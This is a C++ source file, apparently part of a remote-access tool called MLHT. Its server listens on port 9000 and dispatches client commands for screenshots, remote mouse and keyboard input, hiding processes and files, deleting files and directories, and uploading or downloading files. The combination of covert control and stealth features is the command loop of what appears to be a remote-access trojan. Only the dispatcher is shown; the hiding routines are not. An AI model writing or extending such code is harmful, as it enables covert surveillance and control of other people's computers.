#include<stdio.h>


extern MLHT_SERVER* ms;  //MLHT 服务器


void SocketWorking(){
	switch(ms->p_get->PacketAnalyze_RC()){
	case MLHT_MTU_TYPE_RC_START:
		return;
	case MLHT_MTU_TYPE_RC_END:
		return;
	case MLHT_MTU_TYPE_RC_SCREEN:
		switch(ms->GetScreenshoot())
		{            
		case PACKET_ACCEPT_SUCCESS:
			printf("Socker Server: Screenshoot success.\n");
			break;
		case FILE_WRITE_FAIL:
			printf("Socker Server: Write file fail.\n");
			ms->SendFINPacket();
			printf("Socker Server: Send FIN packet back...\n");
			break;
		case FILE_OPEN_FAIL:
			printf("Socker Server: Open file fail.\n");
			ms->SendFINPacket();
			printf("Socker Server: Send FIN packet back...\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Socker Server: Packet accept fail.\n");
			ms->SendFINPacket();
			printf("Socker Server: Send FIN packet back...\n");
			break;
		default:
			printf("Socker Server: Client is blocked\n");
			break;
		}
		return;
	case MLHT_MTU_TYPE_RC_MOUSE_OPERATE:
		ms->GetMouseOperate();
		return;
	case MLHT_MTU_TYPE_RC_KEYBROAD_OPERATE:
		ms->GetKeybroadOperate();
		return;
	default:
		break;
	}

	switch(ms->p_get->PacketAnalyze_PROCESS())
	{
	case MLHT_MTU_TYPE_PROCESS_HIDE:
		ms->GetProcessHide();
		return;
	case MLHT_MTU_TYPE_PROCESS_SHOW:
		ms->GetProcessShow();
		return;
	default:
		break;
	}
	

	switch(ms->p_get->PacketAnalyze_FILE()){
	case MLHT_MTU_TYPE_FILE_HIDE:
		ms->GetFileHide();
		return;
	case MLHT_MTU_TYPE_FILE_SHOW:
		ms->GetFileShow();
		return;
	default:
		break;
	}
	
	
	switch(ms->p_get->PacketAnalyze_SHELL())
	{
	case MLHT_MTU_TYPE_SHELL_LS:
		if(ms->GetShellLs())
			printf("Shell Ls success.\n");
		else{
			printf("List file fail.\n");
			printf("errorcode: %d\n",errno );
		}
		return;
	case MLHT_MTU_TYPE_SHELL_CD:
		return;
	case MLHT_MTU_TYPE_SHELL_MKDIR:
		if(ms->GetShellMkdir())
			printf("MKDIR success\n");
		else{
			printf("MKDIR fail\n");
			printf("errorcode: %d\n",errno );
		}
		return;
	case MLHT_MTU_TYPE_SHELL_RMDIR:
		if(ms->GetShellRmdir())
			printf("RMDIR success\n");
		else{
			printf("RMDIR fail\n");
			printf("errorcode: %d\n",errno );
		}
		return;
	case MLHT_MTU_TYPE_SHELL_RM:
		if(ms->GetShellRm())
			printf("RM success\n");
		else{
			printf("RM fail\n");
			printf("errorcode: %d\n",errno );
		}
		return;
	case MLHT_MTU_TYPE_SHELL_UPLOAD:
		switch(ms->GetUploadFile())
		{
		case SOCKET_ERROR:
			printf("Client is blocked\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Packet accept fail.\n");
			break;
		case OP_SUCCESS:
			printf("Upload success.\n");
			break;
		case OP_FAIL:
			printf("Client error,upload fail.\n");
			break;
		case FILE_WRITE_FAIL:
			printf("Write file fail.\n");
			break;
		case FILE_OPEN_FAIL:
			printf("Open file fail.\n");
			break;
		default:
			printf("Something else wrong,\n");
			break;
		}
		return;
	case MLHT_MTU_TYPE_SHELL_DOWNLOAD:
		switch(ms->SendDownloadFile())
		{
		case SOCKET_ERROR:
			printf("Client is blocked\n");
			break;
		case PACKET_ACCEPT_FAIL:
			printf("Packet accept fail.\n");
			break;
		case OP_SUCCESS:
			printf("Download success.\n");
			break;
		case OP_FAIL:
			printf("Client error,download fail.\n");
			break;
		case FILE_READ_FAIL:
			printf("Read file fail.\n");
			break;
		case FILE_TOO_LARGE:
			printf("File is too large to download.\n");
			break;
		default:
			printf("Something else wrong,\n");
			break;
		}
		return;
	default:
		break;
	}
	
}


void Thread_Socket(){

	int ret;

	ms = new MLHT_SERVER(9000);

	while(true)
	{
		printf("Socket Server:Wait client to link:\n");
		ms->WaitForClient();
		printf("Socket Server:Server is linked by client\n");

		do{
			ret = ms->WaitReturnPacket();//一直接收客户端socket的send操作

			switch(ret)
			{         
			case PACKET_ACCEPT_SUCCESS:
				SocketWorking();
				break;
			case PACKET_ACCEPT_FAIL:
				printf("Get a bad packet from client.\n");
				break;
			default:
				printf("Client is blocked\n");
				break;
			}
		}while(ret!=SOCKET_ERROR);
	}
}